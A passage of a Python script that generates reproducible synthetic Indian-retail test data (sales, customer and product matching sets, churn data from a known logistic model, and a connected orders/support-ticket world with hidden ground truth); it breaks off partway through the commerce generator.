#!/usr/bin/env python3
"""NEXORA deterministic synthetic test-data generator (QA/Security-owned). Stdlib only.

    python testdata/generate.py                       # anchor = today, writes testdata/generated/
    python testdata/generate.py --anchor 2026-11-17   # reproducible: same seed + anchor => identical bytes
    python testdata/generate.py --out /tmp/x --only sales churn

All people, companies, products, emails and phone numbers are synthetic. Emails use reserved example domains.
Every dataset is meant to be loaded with classification='synthetic'.

Outputs (see testdata/README.md for the schema of each file):
    sales.csv                     ~5,000 orders over 24 months up to the anchor month (current month included),
                                  INR prices, Diwali/wedding seasonality, a planted anomaly week, a few nulls and
                                  20 exact duplicate rows
    customers_crm.csv / customers_web.csv / customers_ground_truth.csv
    products_supplier_a.csv / products_supplier_b.csv / products_ground_truth.csv
    churn.csv + churn_meta.json   labelled churn data generated from a known logistic model (oracle AUC)
    customers.csv / products.csv / orders.csv / support_tickets.csv + commerce_meta.json
                                  a connected commerce world over the sales customers (C00001..C00800): churn
                                  hazard + CLV-like value, product variants and duplicate SKUs, support tickets
    adversarial/                  malformed.csv, formula_injection.csv, huge_column.csv, wide_columns.csv,
                                  zip_bomb.xlsx, png_as.csv, text_as.xlsx, mz_as.csv
    MANIFEST.json                 seed, anchor, row counts and sha256 of every file
"""

from __future__ import annotations

import argparse
import calendar
import csv
import datetime as dt
import hashlib
import io
import json
import math
import random
import zipfile
from pathlib import Path

SEED = 20261117
HERE = Path(__file__).resolve().parent
DEFAULT_OUT = HERE / "generated"

REGIONS = ["North", "South", "East", "West", "Central"]
REGION_WEIGHTS = [0.24, 0.22, 0.16, 0.26, 0.12]
CHANNELS = ["Online", "Retail", "Distributor", "Marketplace"]
CHANNEL_WEIGHTS = [0.38, 0.30, 0.17, 0.15]
CITIES = {
    "North": ["Delhi", "Chandigarh", "Lucknow", "Jaipur"],
    "South": ["Bengaluru", "Chennai", "Hyderabad", "Kochi"],
    "East": ["Kolkata", "Bhubaneswar", "Patna", "Guwahati"],
    "West": ["Mumbai", "Pune", "Ahmedabad", "Surat"],
    "Central": ["Bhopal", "Indore", "Nagpur", "Raipur"],
}
CITY_ALIASES = {"Bengaluru": "Bangalore", "Mumbai": "Bombay", "Kolkata": "Calcutta", "Chennai": "Madras"}
FIRST = [
    "Aarav",
    "Vivaan",
    "Aditya",
    "Vihaan",
    "Arjun",
    "Sai",
    "Reyansh",
    "Krishna",
    "Ishaan",
    "Rohan",
    "Ananya",
    "Diya",
    "Aadhya",
    "Saanvi",
    "Pari",
    "Myra",
    "Anika",
    "Kavya",
    "Meera",
    "Riya",
    "Kabir",
    "Dhruv",
    "Nikhil",
    "Pranav",
    "Tanvi",
    "Nisha",
    "Pooja",
    "Sneha",
    "Harsh",
    "Yash",
]
LAST = [
    "Sharma",
    "Verma",
    "Patel",
    "Iyer",
    "Nair",
    "Reddy",
    "Gupta",
    "Mehta",
    "Shah",
    "Joshi",
    "Desai",
    "Kulkarni",
    "Banerjee",
    "Chatterjee",
    "Das",
    "Rao",
    "Menon",
    "Pillai",
    "Singh",
    "Kapoor",
]
EMAIL_DOMAINS = ["example.com", "example.org", "example.net", "mail.example.test"]

# (category, product, base INR price, unit, pack size)
CATALOG = [
    ("Grocery", "Basmati Rice", 649.0, "kg", 5),
    ("Grocery", "Toor Dal", 189.0, "kg", 1),
    ("Grocery", "Sunflower Oil", 899.0, "l", 5),
    ("Grocery", "Masala Chai", 349.0, "g", 500),
    ("Grocery", "Atta Flour", 299.0, "kg", 5),
    ("Grocery", "Cashew Nuts", 499.0, "g", 500),
    ("Electronics", "Bluetooth Earbuds", 1999.0, "pc", 1),
    ("Electronics", "Smart Watch", 3499.0, "pc", 1),
    ("Electronics", "Power Bank 10000mAh", 1299.0, "pc", 1),
    ("Electronics", "LED Bulb 9W", 129.0, "pc", 1),
    ("Electronics", "Wi-Fi Router", 2499.0, "pc", 1),
    ("Electronics", "USB-C Cable", 299.0, "pc", 1),
    ("Apparel", "Cotton Kurta", 899.0, "pc", 1),
    ("Apparel", "Silk Saree", 4999.0, "pc", 1),
    ("Apparel", "Denim Jeans", 1499.0, "pc", 1),
    ("Apparel", "Sports Shoes", 2799.0, "pair", 1),
    ("Home", "Pressure Cooker 5L", 2199.0, "pc", 1),
    ("Home", "Steel Tiffin Box", 599.0, "pc", 1),
    ("Home", "Cotton Bedsheet", 999.0, "pc", 1),
    ("Home", "Ceiling Fan", 2899.0, "pc", 1),
    ("Beauty", "Herbal Shampoo", 249.0, "ml", 340),
    ("Beauty", "Sunscreen SPF50", 449.0, "ml", 100),
    ("Beauty", "Ayurvedic Face Cream", 399.0, "g", 50),
    ("Beauty", "Hair Oil", 199.0, "ml", 200),
]
# Month multipliers: festive peak (Sep-Nov: Navratri/Diwali), wedding season (Dec-Feb), monsoon dip (Jul-Aug)
SEASONALITY = {
    1: 1.05,
    2: 1.0,
    3: 0.95,
    4: 0.9,
    5: 0.92,
    6: 0.88,
    7: 0.8,
    8: 0.85,
    9: 1.15,
    10: 1.45,
    11: 1.4,
    12: 1.1,
}


# ------------------------------------------------------------------------------------------- helpers
def _rng(name: str) -> random.Random:
    """Independent, stable stream per dataset (adding a dataset never shifts another one)."""
    return random.Random(f"{SEED}:{name}")


def _month_add(d: dt.date, months: int) -> dt.date:
    y, m = divmod(d.month - 1 + months, 12)
    return dt.date(d.year + y, m + 1, 1)


def _write_csv(path: Path, header: list[str], rows: list[list]) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow(header)
        w.writerows(rows)
    return len(rows)


def _person(rng: random.Random, idx: int) -> dict:
    first, last = rng.choice(FIRST), rng.choice(LAST)
    region = rng.choices(REGIONS, REGION_WEIGHTS)[0]
    return {
        "person_id": f"P{idx:05d}",
        "first": first,
        "last": last,
        "email": f"{first.lower()}.{last.lower()}{idx}@{rng.choice(EMAIL_DOMAINS)}",
        "phone": f"9{rng.randint(100000000, 999999999)}",
        "city": rng.choice(CITIES[region]),
        "region": region,
        "dob": dt.date(1960, 1, 1) + dt.timedelta(days=rng.randint(0, 365 * 40)),
    }


# ------------------------------------------------------------------------------------------- sales
def gen_sales(out: Path, anchor: dt.date, n_orders: int = 5000) -> dict:
    rng = _rng("sales")
    start = _month_add(anchor.replace(day=1), -23)  # 24 months incl. the anchor month
    months = [_month_add(start, i) for i in range(24)]
    weights = []
    for i, m in enumerate(months):
        trend = 1.0 + 0.012 * i  # ~1.2 %/month growth
        weights.append(
            SEASONALITY[m.month] * trend * (0.5 if m == months[-1] else 1.0)
        )  # anchor month partial
    customers = [_person(rng, i) for i in range(1, 801)]
    # planted anomaly: one week with a 4x spike in Electronics/Online (to be found by anomaly detection)
    anomaly_month = months[-7]
    anomaly_days = {anomaly_month + dt.timedelta(days=d) for d in range(9, 16)}

    rows: list[list] = []
    for i in range(1, n_orders + 1):
        m = rng.choices(months, weights)[0]
        last_day = calendar.monthrange(m.year, m.month)[1]
        if m == months[-1]:
            last_day = min(last_day, anchor.day)
        day = m + dt.timedelta(days=rng.randint(0, last_day - 1))
        cust = rng.choice(customers)
        cat, prod, price, _unit, _pack = rng.choice(CATALOG)
        channel = rng.choices(CHANNELS, CHANNEL_WEIGHTS)[0]
        qty = rng.choices([1, 2, 3, 4, 5, 10], [50, 22, 12, 7, 6, 3])[0]
        if day in anomaly_days and i % 3 == 0:
            cat, prod, price, channel = "Electronics", "Smart Watch", 3499.0, "Online"
            qty *= 4
        unit_price = round(price * rng.uniform(0.95, 1.08), 2)
        discount = rng.choices([0.0, 0.05, 0.1, 0.15, 0.2], [55, 15, 15, 10, 5])[0]
        revenue = round(qty * unit_price * (1 - discount), 2)
        rows.append(
            [
                f"ORD-{anchor.year}-{i:06d}",
                day.isoformat(),
                cust["person_id"].replace("P", "C"),
                f"{cust['first']} {cust['last']}",
                cust["region"],
                prod,
                cat,
                qty,
                f"{unit_price:.2f}",
                f"{discount:.2f}",
                f"{revenue:.2f}",
                channel,
            ]
        )
    rows.sort(key=lambda r: (r[1], r[0]))
    # a few nulls (realistic gaps): customer_name, region, discount, channel
    for col in (3, 4, 9, 11):
        for idx in rng.sample(range(len(rows)), 6):
            rows[idx][col] = ""
    # 20 exact duplicate rows (double-submitted orders)
    dups = [list(rows[idx]) for idx in rng.sample(range(len(rows)), 20)]
    for d in dups:
        rows.insert(rng.randint(0, len(rows)), d)
    header = [
        "order_id",
        "order_date",
        "customer_id",
        "customer_name",
        "region",
        "product",
        "category",
        "quantity",
        "unit_price",
        "discount",
        "revenue",
        "channel",
    ]
    _write_csv(out / "sales.csv", header, rows)
    return {
        "rows": len(rows),
        "unique_orders": n_orders,
        "exact_duplicates": 20,
        "currency": "INR",
        "date_min": min(r[1] for r in rows),
        "date_max": max(r[1] for r in rows),
        "anomaly_week": [min(anomaly_days).isoformat(), max(anomaly_days).isoformat()],
    }


# ------------------------------------------------------------------------------------------- customers
def _typo(rng: random.Random, s: str) -> str:
    if len(s) < 4:
        return s
    i = rng.randint(1, len(s) - 2)
    op = rng.choice(["swap", "drop", "double"])
    if op == "swap":
        return s[:i] + s[i + 1] + s[i] + s[i + 2 :]
    if op == "drop":
        return s[:i] + s[i + 1 :]
    return s[:i] + s[i] + s[i:]


def _phone_variant(rng: random.Random, p: str) -> str:
    return rng.choice([f"+91 {p[:5]} {p[5:]}", f"0{p}", f"+91-{p}", f"{p[:3]}-{p[3:6]}-{p[6:]}", p])


def gen_customers(out: Path) -> dict:
    rng = _rng("customers")
    people = [_person(rng, i) for i in range(1, 701)]
    crm_people = rng.sample(people, 500)
    crm_ids = {p["person_id"]: f"CRM-{i:05d}" for i, p in enumerate(crm_people, 1)}
    overlap = rng.sample(crm_people, 350)
    web_only = [p for p in people if p["person_id"] not in crm_ids][:100]
    web_people = overlap + web_only
    rng.shuffle(web_people)

    crm_rows = []
    for p in crm_people:
        crm_rows.append(
            [
                crm_ids[p["person_id"]],
                p["first"],
                p["last"],
                p["email"],
                p["phone"],
                p["city"],
                p["dob"].isoformat(),
                f"{rng.uniform(1000, 250000):.2f}",
            ]
        )
    web_rows, truth = [], []
    for i, p in enumerate(web_people, 1):
        web_id = f"WEB-{i:05d}"
        name = f"{p['first']} {p['last']}"
        r = rng.random()
        if r < 0.25:
            name = _typo(rng, name)
        elif r < 0.4:
            name = name.upper()
        elif r < 0.5:
            name = f"{p['last']}, {p['first']}"
        email = p["email"]
        if rng.random() < 0.3:
            email = email.upper() if rng.random() < 0.5 else email.replace(".", "", 1)
        city = CITY_ALIASES.get(p["city"], p["city"]) if rng.random() < 0.5 else p["city"]
        signup = dt.date(2023, 1, 1) + dt.timedelta(days=rng.randint(0, 1000))
        web_rows.append(
            [
                web_id,
                name,
                email,
                _phone_variant(rng, p["phone"]),
                city,
                signup.isoformat(),
                rng.choice(["newsletter", "organic", "ads", "referral"]),
            ]
        )
        truth.append([p["person_id"], crm_ids.get(p["person_id"], ""), web_id])
    for p in crm_people:
        if p not in web_people:
            truth.append([p["person_id"], crm_ids[p["person_id"]], ""])
    truth.sort()
    _write_csv(
        out / "customers_crm.csv",
        [
            "crm_id",
            "first_name",
            "last_name",
            "email",
            "phone",
            "city",
            "date_of_birth",
            "lifetime_value_inr",
        ],
        crm_rows,
    )
    _write_csv(
        out / "customers_web.csv",
        ["web_id", "full_name", "email", "mobile", "city", "signup_date", "source"],
        web_rows,
    )
    _write_csv(out / "customers_ground_truth.csv", ["person_id", "crm_id", "web_id"], truth)
    return {
        "crm_rows": len(crm_rows),
        "web_rows": len(web_rows),
        "true_matches": len(overlap),
        "people": len({t[0] for t in truth}),
    }


# ------------------------------------------------------------------------------------------- products
def gen_products(out: Path) -> dict:
    rng = _rng("products")
    brands = ["Sunrise", "Kesar", "Nilgiri", "Ganga", "Sahyadri", "Vindhya", "Konark", "Thar"]
    masters = []
    for i in range(1, 201):
        cat, prod, price, unit, pack = rng.choice(CATALOG)
        brand = rng.choice(brands)
        masters.append(
            {
                "master_id": f"M{i:04d}",
                "brand": brand,
                "name": prod,
                "category": cat,
                "unit": unit,
                "pack": pack,
                "price": round(price * rng.uniform(0.8, 1.3), 2),
            }
        )
    unit_convert = {"kg": ("g", 1000), "l": ("ml", 1000), "g": ("kg", 0.001), "ml": ("l", 0.001)}
    a_rows, b_rows, truth = [], [], []
    a_items = rng.sample(masters, 170)
    b_items = rng.sample(masters, 160)
    a_skus = {}
    for n, m in enumerate(a_items, 1):
        sku = f"A-{m['category'][:3].upper()}-{n:04d}"
        a_skus[m["master_id"]] = sku
        a_rows.append(
            [
                sku,
                f"{m['brand']} {m['name']} {m['pack']}{m['unit']}",
                m["category"],
                m["unit"],
                m["pack"],
                f"{m['price']:.2f}",
                f"89{rng.randint(10**10, 10**11 - 1)}",
            ]
        )
    b_skus = {}
    for n, m in enumerate(b_items, 1):
        sku = f"SB/{n:05d}-{rng.choice('XYZ')}"
        b_skus[m["master_id"]] = sku
        unit, pack = m["unit"], m["pack"]
        if unit in unit_convert and rng.random() < 0.5:
            unit, factor = unit_convert[unit]
            pack = round(pack * factor, 3)
        name = f"{m['name'].upper()} ({m['brand']}) {pack} {unit.upper()}"
        if rng.random() < 0.2:
            name = _typo(rng, name)
        b_rows.append(
            [
                sku,
                name,
                m["category"].lower(),
                f"{pack:g}",
                unit.upper(),
                f"{m['price'] * rng.uniform(0.97, 1.05):.2f}",
                rng.choice(["Y", "N"]),
            ]
        )
    for m in masters:
        truth.append(
            [
                m["master_id"],
                a_skus.get(m["master_id"], ""),
                b_skus.get(m["master_id"], ""),
                f"{m['brand']} {m['name']}",
                m["category"],
                m["unit"],
                m["pack"],
            ]
        )
    _write_csv(
        out / "products_supplier_a.csv",
        ["sku", "product_name", "category", "unit", "pack_size", "mrp_inr", "ean"],
        a_rows,
    )
    _write_csv(
        out / "products_supplier_b.csv",
        ["item_code", "description", "cat", "qty_per_pack", "uom", "price", "in_stock"],
        b_rows,
    )
    _write_csv(
        out / "products_ground_truth.csv",
        [
            "master_id",
            "supplier_a_sku",
            "supplier_b_item_code",
            "canonical_name",
            "category",
            "unit",
            "pack_size",
        ],
        truth,
    )
    both = sum(1 for t in truth if t[1] and t[2])
    return {
        "masters": len(masters),
        "supplier_a": len(a_rows),
        "supplier_b": len(b_rows),
        "true_matches": both,
    }


# ------------------------------------------------------------------------------------------- churn
CHURN_COEF = {
    "intercept": -1.2,
    "tenure_months": -0.045,
    "monthly_spend_k": -0.18,
    "support_tickets": 0.42,
    "days_since_login": 0.035,
    "plan_basic": 0.55,
    "nps": -0.09,
}


def _auc(scores: list[float], labels: list[int]) -> float:
    pairs = sorted(zip(scores, labels, strict=True))
    rank_sum, n_pos, i = 0.0, sum(labels), 0
    while i < len(pairs):
        j = i
        while j < len(pairs) and pairs[j][0] == pairs[i][0]:
            j += 1
        avg_rank = (i + j + 1) / 2  # 1-based average rank for ties
        rank_sum += avg_rank * sum(lbl for _s, lbl in pairs[i:j])
        i = j
    n_neg = len(labels) - n_pos
    return (rank_sum - n_pos * (n_pos + 1) / 2) / (n_pos * n_neg)


def gen_churn(out: Path, n: int = 3000) -> dict:
    rng = _rng("churn")
    rows, probs, labels = [], [], []
    for i in range(1, n + 1):
        tenure = rng.randint(1, 72)
        spend = round(rng.lognormvariate(7.3, 0.6), 2)  # INR / month
        tickets = min(int(rng.expovariate(0.7)), 12)
        login = rng.randint(0, 90)
        plan = rng.choices(["basic", "standard", "premium"], [0.45, 0.35, 0.2])[0]
        nps = rng.randint(0, 10)
        z = (
            CHURN_COEF["intercept"]
            + CHURN_COEF["tenure_months"] * tenure
            + CHURN_COEF["monthly_spend_k"] * spend / 1000
            + CHURN_COEF["support_tickets"] * tickets
            + CHURN_COEF["days_since_login"] * login
            + CHURN_COEF["plan_basic"] * (plan == "basic")
            + CHURN_COEF["nps"] * nps
        )
        p = 1 / (1 + math.exp(-z))
        y = 1 if rng.random() < p else 0
        probs.append(p)
        labels.append(y)
        rows.append(
            [
                f"CUST-{i:05d}",
                tenure,
                f"{spend:.2f}",
                tickets,
                login,
                plan,
                nps,
                rng.choices(REGIONS, REGION_WEIGHTS)[0],
                y,
            ]
        )
    _write_csv(
        out / "churn.csv",
        [
            "customer_id",
            "tenure_months",
            "monthly_spend_inr",
            "support_tickets",
            "days_since_login",
            "plan",
            "nps",
            "region",
            "churned",
        ],
        rows,
    )
    meta = {
        "model": "logistic",
        "coefficients": CHURN_COEF,
        "rows": n,
        "positive_rate": round(sum(labels) / n, 4),
        "oracle_auc": round(_auc(probs, labels), 4),
        "note": "oracle_auc uses the TRUE probabilities: a trained model should approach but not exceed it",
    }
    (out / "churn_meta.json").write_text(json.dumps(meta, indent=2) + "\n", encoding="utf-8")
    return meta


# ------------------------------------------------------------------------------------------- commerce
# A connected commerce world for the demo and for W4 ML / W5 Customer 360 / Product 360:
#   customers.csv        the 800 customers of sales.csv (same ids C00001..C00800 and the same names), enriched
#   products.csv         product master with brand/pack VARIANTS (distinct products) and DUPLICATE listings of the
#                        same product under another SKU format / name / unit (entity-resolution targets)
#   orders.csv           one row per order line, driven by a latent per-customer value (CLV-like) and a monthly
#                        churn hazard (customers stop ordering after churning; frequency drops just before)
#   support_tickets.csv  ticket volume rises and CSAT falls with dissatisfaction and right before a churn
#   commerce_meta.json   the hidden truth: churn dates, expected monthly value, duplicate pairs, variant families
SEGMENTS = ["Consumer", "SMB", "Enterprise"]
SEGMENT_WEIGHTS = [0.70, 0.22, 0.08]
SEGMENT_VALUE = {"Consumer": 1.0, "SMB": 2.4, "Enterprise": 5.5}
LOYALTY_TIERS = ["Bronze", "Silver", "Gold", "Platinum"]
PAYMENT_METHODS = ["UPI", "Card", "NetBanking", "Wallet", "COD"]
PAYMENT_WEIGHTS = [0.46, 0.24, 0.10, 0.08, 0.12]
PRODUCT_BRANDS = ["Sunrise", "Kesar", "Nilgiri", "Ganga", "Sahyadri", "Vindhya", "Konark", "Thar"]
TICKET_CATEGORIES = {
    "account": "Cannot update my registered mobile number",
    "billing": "Charged twice for order {order}",
    "delivery_delay": "Order {order} has not arrived yet",
    "payment_failed": "UPI payment failed but amount debited",
    "product_defect": "{product} stopped working after a week",
    "returns": "Return pickup for {product} not scheduled",
}
TICKET_CHANNELS = ["email", "phone", "chat", "whatsapp"]
CHURN_HAZARD = {"intercept": -4.3, "satisfaction": -1.0, "consumer": 0.35, "tenure_years": -0.15}


def _sigmoid(x: float) -> float:
    return 1 / (1 + math.exp(-x))


def _poisson(rng: random.Random, lam: float) -> int:
    """Knuth method (lam is small here); stdlib-only and deterministic."""
    if lam <= 0:
        return 0
    limit, k, p = math.exp(-lam), 0, 1.0
    while True:
        p *= rng.random()
        if p <= limit:
            return k
        k += 1


def _sales_customers() -> list[dict]:
    """The 800 customers of sales.csv, reproduced exactly: they are the first draws of the sales stream."""
    rng = _rng("sales")
    return [_person(rng, i) for i in range(1, 801)]


def _sku_abbr(name: str) -> str:
    words = [w for w in name.replace("-", " ").split() if w[0].isalpha()]
    return "".join(w[:3] for w in words[:2]).upper()


def _pack_label(pack: float, unit: str) -> str:
    return f"{pack:g}{unit.upper()}"


def _convert_unit(pack: float, unit: str) -> tuple[float, str] | None:
    table = {"kg": ("g", 1000), "l": ("ml", 1000), "g": ("kg", 0.001), "ml": ("l", 0.001)}
    if unit not in table:
        return None
    new_unit, factor = table[unit]
    return round(pack * factor, 3), new_unit


def _display(brand: str, name: str, pack: float, unit: str) -> str:
    return f"{brand} {name}" + (f" {pack:g} {unit}" if unit not in ("pc", "pair") else "")


def _commerce_products(rng: random.Random) -> tuple[list[dict], list[list[str]], list[list[str]]]:
    canon: list[dict] = []
    for cat, prod, price, unit, pack in CATALOG:
        for brand in rng.sample(PRODUCT_BRANDS, 2):
            packs = [pack]
            if unit in ("kg", "l", "g", "ml") and rng.random() < 0.6:
                packs.append(pack * 2 if unit in ("kg", "l") else pack // 2)  # a larger/smaller pack variant
            for pk in packs:
                list_price = round(price * (pk / pack) * rng.uniform(0.85, 1.25), 2)
                canon.append(
                    {
                        "brand": brand,
                        "name": prod,
                        "category": cat,
                        "unit": unit,
                        "pack": float(pk),
                        "price": list_price,
                        "cost": round(list_price * rng.uniform(0.55, 0.75), 2),
                        "launched": dt.date(2021, 1, 1) + dt.timedelta(days=rng.randint(0, 1200)),
                        "status": "active",
                    }
                )
    seen: set[str] = set()
    for i, p in enumerate(canon, 1):
        p["product_id"] = f"PRD-{i:04d}"
        sku = f"{p['brand'][:3].upper()}-{_sku_abbr(p['name'])}-{_pack_label(p['pack'], p['unit'])}"
        if sku in seen:
            sku = f"{sku}-{i}"
        seen.add(sku)
        p["sku"] = sku
        p["display"] = _display(p["brand"], p["name"], p["pack"], p["unit"])
    families: dict[tuple[str, str], list[str]] = {}
    for p in canon:
        families.setdefault((p["brand"], p["name"]), []).append(p["product_id"])
    variant_families = [ids for ids in families.values() if len(ids) > 1]

    dups: list[dict] = []
    pairs: list[list[str]] = []
    for n, p in enumerate(rng.sample(canon, 20), 1):
        d = dict(p)
        d["product_id"] = f"PRD-{len(canon) + n:04d}"
        style = rng.choice(["spaced", "compact", "unit", "legacy"])
        converted = _convert_unit(p["pack"], p["unit"])
        if style == "unit" and converted is None:
            style = "compact"
        if style == "spaced":
            d["sku"] = p["sku"].replace("-", " ").lower()
        elif style == "compact":
            d["sku"] = p["sku"].replace("-", "")
        elif style == "legacy":
            d["sku"] = f"OLD-{p['sku']}"
        else:
            d["pack"], d["unit"] = converted
            d["sku"] = f"{p['brand'][:3].upper()}-{_sku_abbr(p['name'])}-{_pack_label(d['pack'], d['unit'])}"
        name_style = rng.choice(["upper", "bracket", "typo", "same"])
        if name_style == "upper":
            d["display"] = _display(d["brand"], d["name"], d["pack"], d["unit"]).upper()
        elif name_style == "bracket":
            d["display"] = _display("", d["name"], d["pack"], d["unit"]).strip() + f" ({d['brand']})"
        elif name_style == "typo":
            d["display"] = _display(d["brand"], _typo(rng, d["name"]), d["pack"], d["unit"])
        else:
            d["display"] = _display(d["brand"], d["name"], d["pack"], d["unit"])
        d["price"] = round(p["price"] * rng.uniform(0.97, 1.03), 2)
        d["cost"] = round(p["cost"] * rng.uniform(0.97, 1.03), 2)
        d["status"] = rng.choice(["active", "active", "discontinued"])
        dups.append(d)
        pairs.append([p["product_id"], d["product_id"], style])
    return canon + dups, pairs, variant_families


def _months_between(a: dt.date, b: dt.date) -> int:
    return (b.year - a.year) * 12 + b.month - a.month


def gen_commerce(out: Path, anchor: dt.date) -> dict:
    rng = _rng("commerce")
    start = _month_add(anchor.replace(day=1), -23)
    months = [_month_add(start, i) for i in range(24)]

    products, dup_pairs, variant_families = _commerce_products(rng)
    by_id = {p["product_id"]: p for p in products}
    dup_ids = {d for _c, d, _s in dup_pairs}
    dup_of = {c: d for c, d, _s in dup_pairs}
    by_category: dict[str, list[dict]] = {}
    for p in products:
        if p["product_id"] not in dup_ids:
            by_category.setdefault(p["category"], []).append(p)
    categories = sorted(by_category)

    customers, orders, tickets, truth = [], [], [], {}
    for idx, person in enumerate(_sales_customers(), 1):
        cid = f"C{idx:05d}"
        segment = rng.choices(SEGMENTS, SEGMENT_WEIGHTS)[0]
        satisfaction = rng.gauss(0, 1)
        value = SEGMENT_VALUE[segment] * rng.lognormvariate(0, 0.55)  # latent spend multiplier (CLV driver)
        rate = rng.gammavariate(2.2, 0.3) * (1.3 if segment != "Consumer" else 1.0)  # orders per month
        signup = start - dt.timedelta(days=900) + dt.timedelta(days=rng.randint(0, 1560))
        signup = min(signup, anchor - dt.timedelta(days=45))
        favourites = rng.sample(categories, 2)
        active_months = [m for m in months if m >= max(signup.replace(day=1), start)]
        # monthly churn hazard: dissatisfied consumers churn first; long-tenured customers churn less
        churn_date = None
        for m in active_months[:-1]:
            tenure_years = max((m - signup).days / 365.25, 0.0)
            h = _sigmoid(
                CHURN_HAZARD["intercept"]
                + CHURN_HAZARD["satisfaction"] * satisfaction
                + CHURN_HAZARD["consumer"] * (segment == "Consumer")
                + CHURN_HAZARD["tenure_years"] * tenure_years
            )
            if rng.random() < h:
                last_day = calendar.monthrange(m.year, m.month)[1]
                churn_date = max(m + dt.timedelta(days=rng.randint(0, last_day - 1)), signup)
                break
        for m in active_months:
            if churn_date and m > churn_date:
                break
            month_len = calendar.monthrange(m.year, m.month)[1]
            last_day = min(month_len, anchor.day) if m == months[-1] else month_len
            days = [m + dt.timedelta(days=d) for d in range(last_day)]
            days = [d for d in days if d >= signup and (churn_date is None or d < churn_date)]
            if not days:
                continue
            fading = churn_date is not None and _months_between(m, churn_date) <= 2
            lam = rate * SEASONALITY[m.month] * (0.45 if fading else 1.0) * len(days) / month_len
            for _ in range(_poisson(rng, lam)):
                cat = rng.choice(favourites) if rng.random() < 0.7 else rng.choice(categories)
                prod = rng.choice(by_category[cat])
                if prod["product_id"] in dup_of and rng.random() < 0.25:
                    prod = by_id[dup_of[prod["product_id"]]]  # the duplicate listing is sold too
                qty = rng.choices([1, 2, 3, 4, 6, 10], [52, 22, 11, 7, 5, 3])[0]
                if value > 3 and rng.random() < 0.5:
                    qty *= 2
                unit_price = round(prod["price"] * rng.uniform(0.95, 1.05), 2)
                discount = rng.choices([0.0, 0.05, 0.1, 0.15, 0.2], [55, 15, 15, 10, 5])[0]
                amount = round(qty * unit_price * (1 - discount), 2)
                orders.append(
                    [
                        rng.choice(days).isoformat(),
                        cid,
                        prod["product_id"],
                        prod["sku"],
                        qty,
                        f"{unit_price:.2f}",
                        f"{discount:.2f}",
                        f"{amount:.2f}",
                        rng.choices(CHANNELS, CHANNEL_WEIGHTS)[0],
                        rng.choices(PAYMENT_METHODS, PAYMENT_WEIGHTS)[0],
                        rng.choices(["completed", "returned", "cancelled"], [92, 5, 3])[0],
                    ]
                )
            # support tickets: the base rate grows with dissatisfaction, plus a burst right before a churn
            t_lam = (0.03 + 0.14 * _sigmoid(-1.5 * satisfaction)) * len(days) / month_len
            if fading:
                t_lam += 0.6
            for _ in range(_poisson(rng, t_lam)):
                tickets.append([rng.choice(days), cid, rng.choice(sorted(TICKET_CATEGORIES)), satisfaction])
        tier = LOYALTY_TIERS[min(int(value * rate / 0.9), 3)]
        customers.append(
            [
                cid,
                f"{person['first']} {person['last']}",
                person["email"],
                person["phone"] if rng.random() > 0.006 else "",
                person["city"],
                person["region"],
                segment,
                signup.isoformat(),
                person["dob"].isoformat(),
                tier,
                "yes" if rng.random() < 0.62 else "no",
                1 if churn_date is not None else 0,
            ]
        )
        truth[cid] = {
            "churn_date": churn_date.isoformat() if churn_date else None,
            "satisfaction": round(satisfaction, 4),
            "orders_per_month": round(rate, 4),
            "value_multiplier": round(value, 4),
        }

    orders.sort(key=lambda r: (r[0], r[1], r[2], r[4]))
    order_rows = [[f"TXN-{i:07d}", *r] for i, r in enumerate(orders, 1)]
    last_order: dict[str, str] = {}
    last_product: dict[str, str] = {}
    for r in order_rows:
        last_order[r[2]] = r[0]
        last_product[r[2]] = by_id[r[3]]["name"]
    tickets.sort(key=lambda t: (t[0], t[1], t[2]))
    ticket_rows = []
    for i, (opened, cid, category, satisfaction) in enumerate(tickets, 1):
        response_h = rng.lognormvariate(1.2 - 0.25 * satisfaction, 0.6)
        if (anchor - opened).days <= 7 and rng.random() < 0.6:
            status, closed, csat = "open", "", ""
        else:
            status = rng.choice(["resolved", "closed"])
            closed = min(opened + dt.timedelta(days=rng.randint(0, 9)), anchor).isoformat()
            score = round(3.6 + 0.85 * satisfaction + rng.gauss(0, 0.7))
            csat = str(min(max(score, 1), 5)) if rng.random() < 0.7 else ""
        subject = TICKET_CATEGORIES[category].format(
            order=last_order.get(cid, "my order"), product=last_product.get(cid, "The product")
        )
        ticket_rows.append(
            [
                f"TCK-{i:06d}",
                cid,
                opened.isoformat(),
                closed,
                rng.choice(TICKET_CHANNELS),
                category,
                rng.choices(["low", "medium", "high", "urgent"], [30, 45, 20, 5])[0],
                status,
                f"{response_h:.1f}",
                csat,
                subject,
            ]
        )

    _write_csv(
        out / "customers.csv",
        [
            "customer_id",
            "customer_name",
            "email",
            "phone",
            "city",
            "region",
            "segment",
            "signup_date",
            "date_of_birth",
            "loyalty_tier",
            "marketing_opt_in",
            "churned",
        ],
        customers,
    )
    _write_csv(
        out / "products.csv",
        [
            "product_id",
            "sku",
            "product_name",
            "brand",
            "category",
            "unit",
            "pack_size",
            "list_price_inr",
            "cost_inr",
            "status",
            "launched_on",
        ],
        [
            [
                p["product_id"],
                p["sku"],
                p["display"],
                p["brand"],
                p["category"],
                p["unit"],
                f"{p['pack']:g}",
                f"{p['price']:.2f}",
                f"{p['cost']:.2f}",
                p["status"],
                p["launched"].isoformat(),
            ]
            for p in products
        ],
    )
    _write_csv(
        out / "orders.csv",
        [
            "order_id",
            "order_date",
            "customer_id",
            "product_id",
            "sku",
            "quantity",
            "unit_price",
            "discount",
            "amount",
            "channel",
            "payment_method",
            "status",
        ],
        order_rows,
    )
    _write_csv(
        out / "support_tickets.csv",
        [
            "ticket_id",
            "customer_id",
            "opened_on",
            "closed_on",
            "channel",
            "category",
            "priority",
            "status",
            "first_response_hours",
            "csat",
            "subject",
        ],
        ticket_rows,
    )
    meta = {
        "anchor": anchor.isoformat(),
        "churn_hazard": CHURN_HAZARD,
        "duplicate_pairs": dup_pairs,
        "variant_families": variant_families,
        "customers": truth,
        "note": (
            "Hidden truth for evaluation only (never a model input): churn_date, latent satisfaction, order rate "
            "and value multiplier per customer. duplicate_pairs [canonical, duplicate, sku_style] are the SAME "
            "product listed twice; variant_families are DIFFERENT products (pack sizes) of one brand and name."
        ),
    }
    (out / "commerce_meta.json").write_text(json.dumps(meta, indent=1, sort_keys=True) + "\n", encoding="utf-8")
    return {
        "customers": len(customers),
        "churned": sum(c[-1] for c in customers),
